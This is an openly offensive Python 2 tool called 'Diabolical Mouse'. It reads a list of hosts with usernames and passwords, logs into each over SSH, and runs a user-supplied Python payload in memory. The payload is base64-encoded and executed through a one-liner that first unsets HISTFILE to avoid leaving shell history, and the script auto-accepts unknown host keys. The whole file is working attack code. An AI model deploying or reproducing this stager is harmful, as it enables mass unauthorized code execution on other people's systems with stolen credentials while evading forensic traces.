#!/usr/bin/python2
# Converts a python script into a python oneliner
# base64 encoded and executes on the remote host
# over SSH using Paramiko without writing anything
# to the disc.
import paramiko
import sys

clear = "\x1b[0m"
red = "\x1b[1;31m"
green = "\x1b[1;32m"

def banner():
    print """%s
                          ____    .-.
                      .-"`    `",( __\_
       .-==:;-._    .'         .-.     `'.
     .'      `"-:'-/          (  \} -=a  .)
    /            \/       \,== `-  __..-'`
 '-'              |       |   |  .'\ `;
                   \    _/---'\ (   `"`
                  /.`._ )      \ `;
                  \`-/.'        `"`
                   `"\`-.
                      `"`
Diabolical Mouse - In Memory Python Stager over SSH
     %s""" %(green, clear)

def usage(progname):
    print "%susage: %s <targetlist> <payload>%s" %(red, progname, clear)
    print "%sPayload should be a self contained python script of some kind%s" %(red, clear)
    sys.exit(0)

def genPayload(stager):
    print "%s{*} Generating Payload: %s %s" %(green, stager, clear)
    f = open(stager, "r")
    payload = f.read()
    payload = payload.encode('base64')
    payload = payload.strip()
    payload = payload.replace("\n", "")
    payload = """unset HISTFILE;python -c "exec('%s'.decode('base64'))";""" %(payload)
#    print payload
    return payload

def execCmd(host, username, password, payload):
    print "%s{*} Target host: %s...%s" %(green, host, clear)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print "%s{*} Attempting to log in...%s" %(green, clear)
        ssh.connect(host, username=username, password=password)
    except paramiko.AuthenticationException:
        print "%s{-} Login Failure!%s" %(red, clear)
        sys.exit(0)
    print "%s{*} Login Successful!%s" %(green, clear)
    try:
        print "%s{*} Attempting to deploy payload!%s" %(green, clear)
        stdin, stdout, stderr = ssh.exec_command(payload)
        print stdout.read()
    except Exception:
        print "%s{-} Payload Deployment Failure!%s" %(red, clear)
        sys.exit(0)
    print "%s{*} Payload Delivered!%s" %(green, clear)

def hacktheplanet(targetlist, payload):
    print "%s{$$} H4XX0R1NG TH3 PL4N3T!!!!!%s" %(green, clear)
    list = open(targetlist, "r").readlines()
    for target in list:
        target = target.split(":")
        password = target[2]
        execCmd(host=target[0], username=target[1], password=password.strip(), payload=genPayload(payload))
    print "%s{$$$} Attacks Complete!%s" %(green, clear)

def main(args):
    banner()
    if len(sys.argv) != 3:
        usage(sys.argv[0])
    hacktheplanet(targetlist=sys.argv[1], payload=sys.argv[2])

if __name__ == "__main__":
    main(sys.argv)

